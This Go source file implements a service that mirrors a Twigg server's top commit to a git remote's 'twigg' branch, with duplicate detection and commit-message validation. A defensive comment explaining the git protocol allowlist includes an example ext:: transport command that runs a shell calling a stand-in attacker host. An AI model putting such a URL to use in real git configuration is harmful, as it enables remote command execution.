package mirror

import (
	"errors"
	"fmt"
	"monorepo/twigg/server"
	"monorepo/twigg/workdir"
	"os"
	"os/exec"
	"strings"
	"time"
	"unicode/utf8"
)

const gitMirrorCommitMsgIsEnabled = true

func newService(absPathToEmptyFolder string) (*gitMirror, error) {
	wd, err := workdir.New(absPathToEmptyFolder, nil, 0)
	if err != nil {
		return nil, fmt.Errorf("failed to create mirror workdir: %w", err)
	}
	isEmpty, err := wd.IsEmpty()
	if err != nil {
		return nil, fmt.Errorf(
			"failed to check if mirror workdir is emtpy: %w", err)
	}
	if !isEmpty {
		panic(fmt.Sprintf(
			"tried to use non empty dir %s as mirror wd",
			absPathToEmptyFolder))
	}
	return &gitMirror{
		wd: wd,
	}, nil
}

// Service to mirror commits to git repo
type gitMirror struct {
	wd              workdir.Workdir
	lastPurgeFailed bool
}

func (m *gitMirror) PushTopCommit(
	serverRead server.Read,
	srv server.Server, gitRepoUrl string,
	maxWorkdirSizeAllowed int64) error {
	c := srv.Top()

	n, err := srv.GetCommitWorkdirSize(c, serverRead)
	if err != nil {
		return fmt.Errorf("failed to get commit wd size: %w", err)
	}
	if n > maxWorkdirSizeAllowed {
		return fmt.Errorf("%w: size=%d", errCommitIsTooBig, n)
	}

	if m.lastPurgeFailed {
		err = m.wd.Purge()
		if err != nil {
			return fmt.Errorf("failed to purge wd: %w", err)
		}
		m.lastPurgeFailed = false
	}

	isEmpty, err := m.wd.IsEmpty()
	if err != nil {
		return fmt.Errorf("failed to check if workdir is empty: %w", err)
	}
	if !isEmpty {
		return fmt.Errorf("%s is not empty", m.wd.Path())
	}
	originalPath := m.wd.Path()
	defer func() {
		if originalPath != m.wd.Path() {
			panic("path inside PushTopCommit should never change")
		}
		// Purge to get ready for the next time.
		const retries = 2
		delay := 100 * time.Millisecond
		for i := 0; i < retries; i++ {
			purgeErr := m.wd.Purge()
			if purgeErr == nil {
				return
			}
			time.Sleep(delay)
		}
		// If we can't purge, set a flag to purge it on the next call
		m.lastPurgeFailed = true
	}()

	// Run the commands to push
	g := gitCommandRunner{absDirPath: m.wd.Path()}
	// Create new empty repo and ser credentials
	err = g.run("init")
	if err != nil {
		return err
	}
	err = g.run("config user.name Twigg")
	if err != nil {
		return err
	}
	err = g.run("config user.email twigg@twigg.vc")
	if err != nil {
		return err
	}
	err = g.run("remote add origin", gitRepoUrl)
	if err != nil {
		return err
	}

	// mirrorMarker identifies which twigg commit a git commit mirrors.
	// we use it not only for identification but also to avoid consecutivelly
	// pushing duplicated commits to the mirror.
	mirrorMarker := fmt.Sprintf("Twigg mirror c/%dv%d", c.ServerL, c.ServerV)

	// Check if remote branch "twigg" exists.
	// ls-remote --exit-code:
	//   0 = ref exists
	//   2 = ref missing (safe)
	//   1 = network/auth error (must fail)
	err = g.run("ls-remote --exit-code origin twigg")
	if err == nil {
		// Remote twigg exists
		// Fetch only commit metadata for twigg (no files)
		err = g.run("fetch --depth=1 --filter=blob:none origin twigg")
		if err != nil {
			return err
		}

		// Using the mirrorMarker message, check if the tip commit is the same
		// that we're about to push. If so, just return so we dont push the
		// exact same commit on top of each other.
		tipMsg, err := g.runOut("log -1 --format=%B origin/twigg")
		if err != nil {
			return err
		}
		if hasMirrorMarker(tipMsg, mirrorMarker) {
			return nil
		}

		// "Checkout" to twigg without fetching any files
		err = g.run("symbolic-ref HEAD refs/heads/twigg")
		if err != nil {
			return err
		}
		// Soft reset to origin/twigg to reuse its commit history
		// while avoiding a full checkout.
		err = g.run("reset --soft origin/twigg")
		if err != nil {
			return err
		}
	} else {
		// Exit code 2: ref does not exist
		// Other errors: network/token error
		if !strings.Contains(err.Error(), "exit status 2") {
			return err
		}
		// Remote twigg does not exist: create local twigg branch
		if err = g.run("checkout -B twigg"); err != nil {
			return err
		}
	}

	// Load the commit to the workdir
	err = m.wd.Ignore(".git")
	if err != nil {
		return fmt.Errorf("failed to ignore .git: %w", err)
	}
	err = srv.Load(c.ServerL, m.wd, serverRead)
	if err != nil {
		return err
	}
	m.wd.ClearIgnores()
	// Add, commit, and push
	err = g.run("add -A")
	if err != nil {
		return err
	}
	commitMsg := mirrorMarker
	if gitMirrorCommitMsgIsEnabled {
		commitMsg = c.Message
		isValid, errMsg := isValidGitCommitMessage(c.Message)
		if !isValid {
			commitMsg = errMsg
		}
		// Keep the marker as a trailer so deduplication still works with
		// custom commit messages.
		commitMsg += "\n\n" + mirrorMarker
	}
	err = g.run("commit --allow-empty -m", commitMsg)
	if err != nil {
		return err
	}
	err = g.run("push origin twigg")
	if err != nil {
		return err
	}

	return nil
}

type gitCommandRunner struct {
	absDirPath string
}

func (g gitCommandRunner) run(spaceSeparatedCommand string, args ...string) error {
	_, err := g.runOut(spaceSeparatedCommand, args...)
	return err
}

func (g gitCommandRunner) runOut(spaceSeparatedCommand string, args ...string) (string, error) {
	allArgs := strings.Split(spaceSeparatedCommand, " ")
	allArgs = append(allArgs, args...)

	cmd := exec.Command("git", allArgs...)
	cmd.Dir = g.absDirPath
	// GIT_ALLOW_PROTOCOL=https:http restrict git to http/https transports only.
	// This blocks several protocols that git supports by default:
	//  - ext:: -> executes a shell command (RCE vector, e.g. ext::sh -c 'curl attacker.com')
	//  - file://-> reads from the local filesystem (could leak arbitrary files)
	//  - ssh:// -> SSH transport (could trigger SSRF or expose SSH keys)
	//  - git:// -> unauthenticated git protocol
	// Even if a malicious URL is stored in config or reached via a redirect,
	// git will refuse to use any protocol not in this allowlist.
	//
	// GIT_TERMINAL_PROMPT=0 prevents git from blocking indefinitely on a
	// credential prompt if auth fails — without this, a bad remote could
	// hang the process waiting for stdin input.
	cmd.Env = append(os.Environ(),
		"GIT_ALLOW_PROTOCOL=https:http",
		"GIT_TERMINAL_PROMPT=0",
	)

	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("git %s failed. out=%s err=%v", spaceSeparatedCommand, out, err)
	}
	return string(out), nil
}

// hasMirrorMarker reports if a commitMsg has a marker that causes it to be
// considered to have been pushed
func hasMirrorMarker(commitMsg string, marker string) bool {
	return strings.HasSuffix(commitMsg, marker) || strings.HasSuffix(commitMsg, marker+"\n")
}

var errCommitIsTooBig = errors.New("commit is too big")

func isValidGitCommitMessage(msg string) (isValid bool, errorMsg string) {
	// Block the null byte entirely as it can cause string truncation issues in
	// C-based systems
	if strings.Contains(msg, "\x00") {
		return false, "refusing commit message containing null bytes"
	}
	// Ensure the text is valid UTF-8 string encoding
	if !utf8.ValidString(msg) {
		return false, "refusing commit message with invalid UTF-8 encoding"
	}
	// Block messages starting with a dash. some older Git parsers or custom
	// git wrappers can misinterpret it as a configuration parameter.
	trimmed := strings.TrimSpace(msg)
	if strings.HasPrefix(trimmed, "-") {
		return false, "refusing commit message that looks like a Git command option"
	}
	// Prevent excessive payload sizes from exhausting memory or disk space
	if len(msg) > 65535 {
		return false, "refusing excessively long commit message"
	}
	return true, ""
}